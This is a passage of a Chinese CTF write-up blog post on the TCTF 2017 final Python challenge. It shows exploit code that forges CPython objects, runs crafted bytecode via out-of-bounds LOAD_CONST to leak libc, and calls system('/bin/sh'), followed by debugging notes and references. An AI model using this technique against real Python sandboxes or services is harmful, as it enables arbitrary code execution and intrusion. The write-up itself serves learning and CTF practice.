class="string">"a"</span>*<span class="number">4</span>+<span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">8</span>)+p64(id(fake_type))+p64(<span class="number">1</span>)+p64(id(fake_type)) <span class="comment">#padding+prev+next+ref+type</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_obj_ptr 的头指针</span></span><br><span class="line">    fake_obj_ptr=id(fake_obj)+<span class="number">0x38</span></span><br><span class="line">    print(<span class="string">"[*] info fake_obj_beg: "</span>+hex(fake_obj_ptr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这个load用来存储fake_obj_ptr的地址，因为在python中万物皆对象，</span></span><br><span class="line">    <span class="comment"># 在字节码的栈中进行load操作，</span></span><br><span class="line">    <span class="comment"># 寻址的时候是用指向fake_obj对象的指针减去const中的第一个指针所在的地址来计算偏移的</span></span><br><span class="line">    to_load=<span class="string">"aaaa"</span>+p64(fake_obj_ptr)</span><br><span class="line">    to_load_ptr=id(to_load)+<span class="number">0x38</span></span><br><span class="line">    print(<span class="string">"[+] to_load_ptr: "</span>+hex(to_load_ptr))</span><br><span class="line"></span><br><span class="line">    const=(<span class="string">"aaaaaa"</span>,)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add 0x28 to get first obj's address in const</span></span><br><span class="line">    const_ptr=id(const)+<span class="number">0x28</span></span><br><span class="line">    print(<span class="string">"[*] info const_ptr: "</span>+hex(const_ptr))</span><br><span class="line"></span><br><span class="line">    offset=((to_load_ptr-const_ptr)/<span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    print(<span class="string">"[+] Success offset: "</span>+hex(offset))</span><br><span class="line"></span><br><span class="line">    code=get_code(</span><br><span class="line">        <span class="comment"># 这里使用extended_arg来将寄存器拓展到4个byte</span></span><br><span class="line">        extended_arg+</span><br><span class="line">        p16(offset &gt;&gt; <span class="number">16</span>)+</span><br><span class="line">        <span class="comment"># load_const将偏移处的指针的对象加载进数据栈，也就是fake_obj</span></span><br><span class="line">        load_const+</span><br><span class="line">        p16(offset&amp;<span class="number">0xffff</span>)+</span><br><span class="line">        <span class="comment"># 此时TOS为fake_obj，直接调用call_function调用我们前面伪造的函数指针</span></span><br><span class="line">        call_function+</span><br><span class="line">        p16(<span class="number">0</span>),</span><br><span class="line">        const</span><br><span class="line">    )</span><br><span class="line">    code()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(addr)</span>:</span></span><br><span class="line">    const=(<span class="number">123</span>,)</span><br><span class="line">    const_ptr=id(const)+<span class="number">0x28</span></span><br><span class="line">    ba=bytearray(<span class="string">"111"</span>)</span><br><span class="line">    bytearray_type=int(ba.__subclasshook__.__str__().split(<span class="string">"at "</span>)[<span class="number">1</span>][:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    fake_bytearray=<span class="string">"a"</span>*<span class="number">4</span>+p64(id(ba))*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(bytearray_type)+p64(<span class="number">8</span>)+p64(<span class="number">0x100</span>)*<span class="number">2</span>+p64(addr)</span><br><span class="line">    fake_bytearray_ptr=id(fake_bytearray)+<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">    loader=<span class="string">"a"</span>*<span class="number">4</span>+p64(fake_bytearray_ptr)</span><br><span class="line">    loader_ptr=id(loader)+<span class="number">0x38</span></span><br><span class="line">    print(<span class="string">"[*] loader: "</span>+hex(id(loader_ptr)))</span><br><span class="line">    offset=<span class="number">0xffffffff</span> &amp; ((loader_ptr-const_ptr)//<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    code=get_code(</span><br><span class="line">        extended_arg+</span><br><span class="line">        p16(offset&gt;&gt;<span class="number">16</span>)+</span><br><span class="line">        load_const+</span><br><span class="line">        p16(offset&amp;<span class="number">0xffff</span>)+</span><br><span class="line">        return_value,</span><br><span class="line">        const</span><br><span class="line">    )</span><br><span class="line">    fb=code()</span><br><span class="line">    libc=u64(str(fb).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))[<span class="number">0</span>]<span class="number">-0x3c48e0</span></span><br><span class="line">    print(<span class="string">"[+] libc: "</span>+hex(libc))</span><br><span class="line">    system_addr=libc+<span class="number">0x45390</span></span><br><span class="line">    system(system_addr)</span><br><span class="line"></span><br><span class="line">libc_ptr=id(sys.stdin)+<span class="number">0x20</span></span><br><span class="line">print(<span class="string">"[*] info stdin: "</span>+hex(libc_ptr))</span><br><span class="line"></span><br><span class="line">pwn(libc_ptr)</span><br></pre></td></tr></table></figure>
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
+<li><p>我看到师傅还提到存在不能使用id的方法如何处理. 我的处理方法是obj.(这里可以是任意一个方法).<strong>str</strong>()这样均可以输出地址</p>
+</li>
+<li><p>Python中万物皆对象, 指针也都是对象的指针, 这一点需要牢记. 在debug的时候因为这个浪费了很多的时间. </p>
+</li>
+<li><p>还有在调试时, 因为一开始我就封装了函数, 所以在其中有一些变量直接回收了… 就很尴尬, 调试也很不好调试. 针对这种情况, 我思考了一下可能的解决办法:</p>
+<blockquote>
+<ol>
+<li>将需要调试的变量return回主函数, 我懒得去掉函数了, 就选择这样做了</li>
+<li>最后再封装函数 (废话!)</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><p>参考第四个参考链接, 设置好gdb, 然后即可<code>p *(PyObject*)address</code>直接输出结构体</p>
+<p>用<code>p &amp;((PyTypeObject*)0)-&gt;tp_call</code> 可以直接输出结构体中变量的偏移 (byzero &amp;&amp; Lewis tql !!!)</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/86366" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86366</a></p>
+<p><a href="https://docs.python.org/2.7/library/dis.html#python-bytecode-instructions" target="_blank" rel="noopener">https://docs.python.org/2.7/library/dis.html#python-bytecode-instructions</a></p>
+<p><a href="https://www.imooc.com/article/details/id/29111" target="_blank" rel="noopener">https://www.imooc.com/article/details/id/29111</a></p>
+<p><a href="https://devguide.python.org/gdb/" target="_blank" rel="noopener">https://devguide.python.org/gdb/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Q4n</p>
+              <p class="site-description motion-element" itemprop="description">划水狗没有明天！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Q4n" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:907659303@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TCTF-2017-final-Python"><span class="nav-number">1.</span> <span class="nav-text">TCTF 2017 final Python</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目简介"><span class="nav-number">1.1.</span> <span class="nav-text">题目简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python-虚拟机原理"><span class="nav-number">1.3.</span> <span class="nav-text">Python 虚拟机原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PyObject对象"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">PyObject对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#code对象"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">code对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PyTypeObject"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">PyTypeObject</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行原理"><span class="nav-number">1.3.0.4.</span> <span class="nav-text">运行原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进入正题"><span class="nav-number">1.4.</span> <span class="nav-text">进入正题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#运行任意字节码"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">运行任意字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#前置知识"><span class="nav-number">1.4.0.1.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Python字节码-个人理解"><span class="nav-number">1.4.0.1.1.1.</span> <span class="nav-text">Python字节码(个人理解)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#types-CodeType"><span class="nav-number">1.4.0.1.1.2.</span> <span class="nav-text">types.CodeType</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#任意字节码执行"><span class="nav-number">1.4.0.1.2.</span> <span class="nav-text">任意字节码执行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#从执行任意字节码到任意代码执行"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">从执行任意字节码到任意代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#劫持程序执行流"><span class="nav-number">1.4.0.2.1.</span> <span class="nav-text">劫持程序执行流</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#任意地址读"><span class="nav-number">1.4.0.2.2.</span> <span class="nav-text">任意地址读</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Getshell"><span class="nav-number">1.4.0.2.3.</span> <span class="nav-text">Getshell</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">1.5.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试方法"><span class="nav-number">1.6.</span> <span class="nav-text">调试方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.7.</span> <span class="nav-text">参考</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Q4n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
